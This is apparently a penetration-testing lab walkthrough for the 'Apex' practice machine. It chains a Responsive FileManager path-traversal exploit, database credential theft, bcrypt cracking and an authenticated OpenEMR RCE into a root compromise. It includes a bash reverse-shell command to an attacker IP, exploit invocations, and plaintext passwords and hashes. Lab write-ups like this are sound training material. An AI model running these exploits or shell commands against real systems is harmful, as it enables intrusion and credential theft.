> Noamro08 - 10 Feb 2024

### Tareget:  192.168.153.145

---
## Enumeration:

nmap scan - default scripts, services top 1000 ports:
```bash
nmap -Pn -n -A 192.168.153.145 -oN inital.scan
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: APEX Hospital
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 33
|   Capabilities flags: 63487
|   Some Capabilities: ODBCClient, Speaks41ProtocolNew, Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsCompression, InteractiveClient, FoundRows, SupportsLoadDataLocal, LongColumnFlag, ConnectWithDatabase, LongPassword, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: WV'^'DbBbH}_F|aOHZm4
|_  Auth Plugin Name: mysql_native_password
Service Info: Host: APEX
```

scan for all ports:
```bash
nmap -Pn -n -p- 192.168.153.145 -oN all.ports --min-rate=5000
80/tcp   open  http
445/tcp  open  microsoft-ds
3306/tcp open  mysql
```

fuzzing dirs with ffuf:
```bash
ffuf -u http://192.168.163.145/FUZZ -w /usr/share/dirb/wordlists/big.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.163.145/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

assets                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 76ms]
filemanager             [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 76ms]
source                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 77ms]
thumbs                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 111ms]
```

in /filemanger we can see it is "Responsive FileManager v.9.13.4":
![[Pasted image 20240211004241.png]]

so we search for exploits with searchsploit:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/apex]
└─$ searchsploit filemanager 9.13.4

Responsive FileManager 9.13.4 - 'path' Path Traversal | php/webapps/49359.py
```
we can see there is an path traversal exploit to this version.

i copied the exploit and examine it, the arguments are: "URL, SESSION, File Path":
`python3 49359.py http://192.168.163.145/ PHPSESSID=rgbrj0p251naofvj6u4f4mhp36 /etc/passwd`
![[Pasted image 20240211005201.png]]
we can get from the /etc/passwd file the user white!

Since we know that OpenEMR is running on the system, let’s look for interesting files in it’s public repository https://github.com/openemr/openemr/
![[Pasted image 20240211010839.png]]
The sqlconf.php present in openemr/sites/default seems to contain credentials for the database, lets try exploiting the directory traversal in Responsive File Manager to read sqlconf.php assuming the default path as /var/www/openemr/sites/default/sqlconf.php

`python3 49359.py http://192.168.129.145 PHPSESSID=b2c1phka86mnkrcif4sjm3fk16 /var/www/openemr/sites/default/sqlconf.php`
trying the exploit again, The exploit works, but since it is a PHP file we can’t read it via Responsive File Manager.

We know from our enumeration that Documents folder in filemanager can be accessed via the docs smb share:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/apex]
└─$ crackmapexec smb 192.168.153.145 --shares -u ori -p '123123123'
SMB         192.168.153.145 445    APEX             [*] Windows 6.1 (name:APEX) (domain:) (signing:False) (SMBv1:True)
SMB         192.168.153.145 445    APEX             [+] Enumerated shares
SMB         192.168.153.145 445    APEX             Share           Permissions     Remark
SMB         192.168.153.145 445    APEX             -----           -----------     ------
SMB         192.168.153.145 445    APEX             docs            READ            Documents
```

```bash
smbclient //192.168.163.145/docs -U 'white'
Password for [WORKGROUP\white]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Apr  9 18:47:12 2021
  ..                                  D        0  Sun Feb 11 00:50:42 2024
  OpenEMR Success Stories.pdf         A   290738  Fri Apr  9 18:47:12 2021
  OpenEMR Features.pdf                A   490355  Fri Apr  9 18:47:12 2021
```
![[Pasted image 20240211011308.png]]
we can see these files in the "docs" smb share.

Let’s modify the exploit’s path to copy the file into the Documents folder (Line 36 of the exploit code):
```python
url_paste, data="path=Documents/", headers=headers)
```

now exploiting this will put the file in the docs smb share:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/apex]
└─$ python3 49359.py http://192.168.163.145/ PHPSESSID=rgbrj0p251naofvj6u4f4mhp36 /var/www//openemr/sites/default/sqlconf.php
```
![[Pasted image 20240211011630.png]]

now by viewing this file:
```bash
$login  = 'openemr';
$pass   = 'C78maEQUIEuQ';
```
we get this credentials for the mysql database

connecting to mysql server:
`mysql -h 192.168.163.145 -u 'openemr' -pC78maEQUIEuQ -D openemr -A`

in the mysql server we can see the hash for 'admin':
![[Pasted image 20240211012639.png]]
<font color="#92d050">admin: $2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC</font>

now cracking this password with john:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/apex]
└─$ echo '$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC' > admin.hash

john admin.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thedoctor        (?)     
1g 0:00:00:10 DONE (2024-02-11 01:25) 0.09293g/s 4055p/s 4055c/s 4055C/s versus..sportygirl
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```
<font color="#92d050">admin: thedoctor</font>

now we login to the "http://192.168.163.145/openemr/interface/login/login.php?site=default"
![[Pasted image 20240211012958.png]]

## RCE:
now we can see the version of this 'openemr' site "5.0.1", searching for exploits we find this RCE:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/apex]
└─$ searchsploit OpenEMR 5.0.1
OpenEMR 5.0.1 - Remote Code Execution (1) | php/webapps/48515.py
```
examining the exploit:
i change the IP and port to match our nc listener and the credentials to match out target.

also we have this [POC blog](https://musyokaian.medium.com/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69)
```bash
python3 48515.py
```
i get a lot of errors and it does not working.

searching for another we can see this one:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/apex]
└─$ searchsploit OpenEMR 5.0.1
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated) | php/webapps/45161.py
```
copying the exploit to our location:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/apex]
└─$ searchsploit -m 45161
```

the usage of this exploit is very simple: " 'target/openemr' 'user' 'pass' 'command' ":
```bash
python2 45161.py http://192.168.163.145/openemr/ -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.161/80 0>&1'
```
it works only with python2...
![[Pasted image 20240211020901.png]]
we get shell.

improve it with python tty method:
```bash
www-data@APEX:/var/www/openemr/interface/main$ python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL ^Z
---
stty size            
42 189
stty raw -echo; fg
---
www-data@APEX:/var/www/openemr/interface/main$ stty rows 42 columns 189
```

## Privesc
after a bit of internal enumeration we find nothing so we try to reuse the password that we have to root and it works!:
```bash
www-data@APEX:/var/www/openemr$ su
Password: 'thedoctor'
root@APEX:/var/www/openemr# cat /root/proof.txt 
fedd08a37fd9af417d31e17513a1e716
```
